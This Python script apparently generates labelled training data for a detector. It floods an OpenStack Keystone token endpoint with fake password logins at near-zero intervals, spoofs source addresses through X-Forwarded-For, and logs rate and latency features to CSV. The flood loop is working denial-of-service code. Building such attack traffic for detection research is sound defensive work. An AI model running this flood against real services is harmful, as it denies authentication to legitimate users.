#!/usr/bin/env python3
"""
5_attack_dos.py
================
Simulates a Denial of Service (DoS) attack against Keystone.

Attack pattern:
- Extremely high req_rate_per_ip_60s (100-300+/min)
- Very low inter-request time (near-zero sleep)
- Single endpoint flooded repeatedly
- Same source IP (or small pool)
- Server may return 503 / 429 under load
"""

import requests
import time
import random
import csv
import os
import argparse
import json
from datetime import datetime
from config import KEYSTONE_URL, OUTPUT_DIR, ATTACK_TARGET

os.makedirs(OUTPUT_DIR, exist_ok=True)

TARGET_ENDPOINTS = [
    f"{KEYSTONE_URL}/v3/auth/tokens",
    f"{KEYSTONE_URL}/v3/auth/catalog",
    f"{KEYSTONE_URL}/v3/projects",
]

LOG_FIELDS = [
    "timestamp", "hour_of_day", "minute_of_hour", "day_of_week",
    "is_business_hours", "http_method", "endpoint_name",
    "endpoint_category", "path_depth", "request_bytes",
    "response_bytes", "status_code", "status_class",
    "response_time_ms", "is_slow_request", "is_auth_endpoint",
    "is_admin_endpoint", "user_id_hash", "has_user_context",
    "req_rate_per_ip_60s", "fail_rate_per_ip_60s",
    "user_req_count_60s", "avg_response_time_recent",
    "has_error_log", "is_burst", "is_repeated_fail",
    "source_ip", "label"
]


class RateTracker:
    def __init__(self):
        self.requests = []
        self.fails    = []
        self.times    = []

    def add(self, ts, success, resp_ms):
        self.requests.append(ts)
        self.times.append((ts, resp_ms))
        if not success:
            self.fails.append(ts)
        cutoff = ts - 60
        self.requests = [t for t in self.requests if t > cutoff]
        self.fails    = [t for t in self.fails    if t > cutoff]
        self.times    = [(t, r) for t, r in self.times if t > cutoff]

    def req_rate(self):
        return len(self.requests)

    def fail_rate(self):
        return len(self.fails) / len(self.requests) if self.requests else 0.0

    def avg_resp(self):
        return sum(r for _, r in self.times) / len(self.times) if self.times else 0.0


def single_dos_request(url, source_ip):
    """Send a single DoS flood request."""
    body = {
        "auth": {
            "identity": {
                "methods": ["password"],
                "password": {
                    "user": {
                        "name": "dos_user",
                        "password": "x",
                        "domain": {"name": "Default"}
                    }
                }
            }
        }
    }
    headers   = {"Content-Type": "application/json",
                 "X-Forwarded-For": source_ip}
    req_bytes = len(json.dumps(body)) + len(str(headers))

    ts = time.time()
    try:
        resp       = requests.post(url, json=body, headers=headers, timeout=5)
        resp_ms    = (time.time() - ts) * 1000
        status     = resp.status_code
        resp_bytes = len(resp.content)
    except Exception:
        resp_ms    = (time.time() - ts) * 1000
        status     = 0
        resp_bytes = 0

    return status, resp_ms, req_bytes, resp_bytes


def simulate_dos(target=ATTACK_TARGET, output_file=None):
    if output_file is None:
        output_file = os.path.join(OUTPUT_DIR, "raw_dos.csv")

    print(f"DoS simulation")
    print(f"Target: {target} requests → {output_file}\n")

    tracker      = RateTracker()
    rows         = []
    total        = 0
    recent_times = []
    source_ip    = f"10.0.0.{random.randint(1, 5)}"   # few IPs — DoS pattern
    url          = TARGET_ENDPOINTS[0]                  # flood auth endpoint

    while total < target:
        status, resp_ms, req_bytes, resp_bytes = single_dos_request(url, source_ip)

        success = 200 <= status < 400
        now     = time.time()
        tracker.add(now, success, resp_ms)
        recent_times.append(resp_ms)
        if len(recent_times) > 20:
            recent_times.pop(0)

        dt     = datetime.now()
        hour   = dt.hour
        is_biz = 1 if 9 <= hour <= 18 else 0

        row = {
            "timestamp":                dt.isoformat(),
            "hour_of_day":              hour,
            "minute_of_hour":           dt.minute,
            "day_of_week":              dt.weekday(),
            "is_business_hours":        is_biz,
            "http_method":              2,   # POST
            "endpoint_name":            "auth_tokens",
            "endpoint_category":        1,
            "path_depth":               3,
            "request_bytes":            req_bytes,
            "response_bytes":           resp_bytes,
            "status_code":              status,
            "status_class":             status // 100 if status > 0 else 0,
            "response_time_ms":         round(resp_ms, 2),
            "is_slow_request":          1 if resp_ms > 500 else 0,
            "is_auth_endpoint":         1,
            "is_admin_endpoint":        0,
            "user_id_hash":             0,
            "has_user_context":         0,
            "req_rate_per_ip_60s":      tracker.req_rate(),
            "fail_rate_per_ip_60s":     round(tracker.fail_rate(), 4),
            "user_req_count_60s":       tracker.req_rate(),
            "avg_response_time_recent": round(
                sum(recent_times) / len(recent_times), 2),
            "has_error_log":            1 if status >= 500 else 0,
            "is_burst":                 1,
            "is_repeated_fail":         0,
            "source_ip":                source_ip,
            "label":                    1,
        }

        rows.append(row)
        total += 1

        if total % 200 == 0:
            print(f"  [{total}/{target}] "
                  f"req_rate={tracker.req_rate()}/60s "
                  f"avg_resp={tracker.avg_resp():.0f}ms")

        # Very low sleep — this is the key DoS signal
        time.sleep(random.uniform(0.01, 0.1))

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        writer.writeheader()
        writer.writerows(rows)

    print(f"\n[DONE] {total} requests written → {output_file}")
    print(f"  Max req_rate: {max(r['req_rate_per_ip_60s'] for r in rows)}/60s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS flood attack simulator")
    parser.add_argument("--target", type=int, default=ATTACK_TARGET)
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()
    simulate_dos(target=args.target, output_file=args.output)
